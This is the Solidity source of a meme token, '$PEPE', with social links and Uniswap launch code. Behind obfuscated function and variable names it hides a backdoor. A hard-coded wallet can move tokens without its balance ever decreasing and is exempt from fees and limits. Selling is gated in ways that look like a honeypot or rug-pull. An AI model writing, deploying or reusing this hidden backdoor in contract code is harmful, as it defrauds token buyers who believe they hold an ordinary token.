/**

HarryPotterObamMattFurie1Meme   $PEPE



Twitter: https://twitter.com/HPepe_erc
Telegram: https://t.me/HPepe_erc
Website: https://pepeerc.com/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  qkjuh(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qkjuh(a, b, "SafeMath");
    }

    function  qkjuh(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2dFactoryd {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2gRouterkg {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"HarryPotterObamMattFurie1Meme";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 100000000 * (10**_decimals);
    uint256 public _taxtSwaprt = _totalSupply;
    uint256 public _maxpHoldpAmount = _totalSupply;
    uint256 public _taxSwapiThreshotu = _totalSupply;
    uint256 public _taxSwapqMaq = _totalSupply;

    uint256 private _initialBuyTax=10;
    uint256 private _initialSellTax=10;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxhAt=7;
    uint256 private _reduceSellTaxhAt=1;
    uint256 private _swprkgecr=0;
    uint256 private _pcvpyxwp=0;
    address public  _empcxgvtep = 0x61a98Cc8d0516A04c49eDc2DBc7969B7d39f40f8;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _rkcvtloes;
    mapping (address => bool) private  _olsvewkxt;
    mapping(address => uint256) private  _oygTrarmrszr;
    bool public  tranfgDelyEnbled = false;


    IUniswapV2gRouterkg private  _unisV2jRouterj;
    address private  _unisV2jLj;
    bool private  _wvteyuafk;
    bool private  _injTaxjSwap = false;
    bool private  _solUnivwapsy = false;
 
 
    event RstuAknblr(uint _taxtSwaprt);
    modifier lockfTofSwapf {
        _injTaxjSwap = true;
        _;
        _injTaxjSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _rkcvtloes[owner()] = true;
        _rkcvtloes[address(this)] = true;
        _rkcvtloes[_empcxgvtep] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. qkjuh(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (tranfgDelyEnbled) {
                if  (to!= address(_unisV2jRouterj) &&to!= address(_unisV2jLj)) {
                  require (_oygTrarmrszr[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _oygTrarmrszr[tx.origin] = block.number;
                }
            }

            if  ( from == _unisV2jLj && to!= address (_unisV2jRouterj) &&!_rkcvtloes[to]) {
                require (amount <= _taxtSwaprt, "Farbidh");
                require (balanceOf (to) + amount <= _maxpHoldpAmount,"Farbidh");
                if  (_pcvpyxwp < _swprkgecr) {
                  require (!rueqrqu(to));
                }
                _pcvpyxwp ++ ; _olsvewkxt[to] = true;
                taxAmount = amount.mul((_pcvpyxwp > _reduceBuyTaxhAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _unisV2jLj&&from!= address (this) &&! _rkcvtloes[from]) {
                require (amount <= _taxtSwaprt && balanceOf(_empcxgvtep) <_taxSwapqMaq, "Farbidh");
                taxAmount = amount.mul((_pcvpyxwp > _reduceSellTaxhAt) ?_finalSellTax:_initialSellTax).div(100);
                require (_pcvpyxwp >_swprkgecr && _olsvewkxt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_injTaxjSwap 
            &&  to  ==_unisV2jLj&&_solUnivwapsy &&contractTokenBalance > _taxSwapiThreshotu 
            &&  _pcvpyxwp > _swprkgecr &&! _rkcvtloes [to] &&! _rkcvtloes [from]
            )  {
                _transferFrom(ubfep(amount,ubfep(contractTokenBalance, _taxSwapqMaq)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = qkjuh(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qkjuh (taxAmount));
        emit  Transfer( from, to, amount. qkjuh(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockfTofSwapf {
        if(_swapTaxAndLiquify==0){return;}
        if(!_wvteyuafk){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _unisV2jRouterj.WETH();
        _approve(address (this), address (_unisV2jRouterj), _swapTaxAndLiquify);
        _unisV2jRouterj.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function ubfep(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function qkjuh(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _empcxgvtep) {
        return a;
    } else {
        require(a >= b, "Farbidh");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _taxtSwaprt  =  _totalSupply ;
        _maxpHoldpAmount = _totalSupply ;
        tranfgDelyEnbled = false ;
        emit  RstuAknblr ( _totalSupply ) ;
    }

   function rueqrqu(address account) private view returns (bool) {
    uint256 codeSize;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly {
        codeSize := extcodesize(account)
    }

    return codeSize > 0;
    }


    function openTrading() external onlyOwner() {
        require (!_wvteyuafk, "trading  is  open") ;
        _unisV2jRouterj = IUniswapV2gRouterkg (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve (address (this),address(_unisV2jRouterj), _totalSupply);
        _unisV2jLj = IUniswapV2dFactoryd(_unisV2jRouterj.factory()).createPair (address(this), _unisV2jRouterj. WETH());
        _unisV2jRouterj.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_unisV2jLj).approve (address(_unisV2jRouterj), type(uint). max);
        _solUnivwapsy = true ;
        _wvteyuafk = true ;
    }

    receive( )  external  payable  { }
    }